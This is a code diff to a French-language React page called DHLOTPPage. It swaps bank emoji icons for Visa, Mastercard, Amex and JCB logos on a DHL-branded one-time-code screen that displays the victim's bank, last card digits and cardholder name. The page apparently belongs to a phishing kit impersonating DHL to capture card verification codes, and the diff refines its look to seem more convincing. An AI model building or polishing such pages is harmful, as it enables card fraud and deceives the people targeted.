@@ -17,7 +17,6 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [paymentId, setPaymentId] = useState<string>(propPaymentId || "");
   const [bankName, setBankName] = useState("Votre Banque");
-  const [bankFlag, setBankFlag] = useState("🏦");
   const [cardLast4, setCardLast4] = useState("****");
   const [cardholderName, setCardholderName] = useState("");
   const [currentDate, setCurrentDate] = useState("");
@@ -33,22 +32,15 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
     return date.toLocaleDateString('fr-FR', options);
   };
 
-  // Bank flags mapping
-  const getBankFlag = (name: string): string => {
-    const flags: Record<string, string> = {
-      "BNP Paribas": "🏦",
-      "Crédit Agricole": "🌾",
-      "Société Générale": "🏛️",
-      "Crédit Mutuel": "💚",
-      "LCL": "💙",
-      "Caisse d'Épargne": "🐿️",
-      "La Banque Postale": "📮",
-      "Boursorama": "🦁",
-      "Visa": "💳",
-      "Mastercard": "💳",
-      "American Express": "💳",
+  // Get card logo based on bank name
+  const getCardLogo = (name: string): string | null => {
+    const logos: Record<string, string> = {
+      "Visa": "/cards/visa.png",
+      "Mastercard": "/cards/mastercard.png",
+      "American Express": "/cards/amex.png",
+      "JCB": "/cards/jcb.jpg",
     };
-    return flags[name] || "🏦";
+    return logos[name] || null;
   };
 
   useEffect(() => {
@@ -67,7 +59,6 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
         .then(data => {
           if (data.bankName) {
             setBankName(data.bankName);
-            setBankFlag(getBankFlag(data.bankName));
           }
           if (data.cardNumber) {
             setCardLast4(data.cardNumber.slice(-4));
@@ -131,20 +122,20 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
     <div className="min-h-screen bg-gradient-to-br from-yellow-50 to-red-50 flex items-center justify-center p-4">
       <Card className="w-full max-w-md shadow-xl border-2 border-[#FFCC00]">
         <CardHeader className="space-y-4 text-center bg-gradient-to-r from-[#FFCC00] to-[#D40511] text-white pb-8">
-          <div className="flex justify-center">
-            <div className="bg-white rounded-full p-6 shadow-lg" data-testid="bank-logo">
-              <div className="text-6xl">{bankFlag}</div>
+          {/* Card Logo Only */}
+          {getCardLogo(bankName) && (
+            <div className="flex justify-center pt-4" data-testid="card-logo">
+              <div className="bg-white rounded-lg px-6 py-4 shadow-lg">
+                <img 
+                  src={getCardLogo(bankName)!} 
+                  alt={bankName} 
+                  className="h-12 object-contain"
+                />
+              </div>
             </div>
-          </div>
-          <div className="text-3xl font-bold mb-2" data-testid="bank-name">{bankName}</div>
+          )}
           
-          {/* Card Logos */}
-          <div className="flex justify-center gap-3 py-2">
-            <img src="/cards/visa.png" alt="Visa" className="h-8 object-contain bg-white px-2 py-1 rounded" />
-            <img src="/cards/mastercard.png" alt="Mastercard" className="h-8 object-contain bg-white px-2 py-1 rounded" />
-            <img src="/cards/amex.png" alt="American Express" className="h-8 object-contain bg-white px-2 py-1 rounded" />
-            <img src="/cards/jcb.jpg" alt="JCB" className="h-8 object-contain bg-white px-2 py-1 rounded" />
-          </div>
+          <div className="text-3xl font-bold mb-2" data-testid="bank-name">{bankName}</div>
           
           {/* Current Date */}
           <div className="text-sm text-white/80 font-medium" data-testid="current-date">
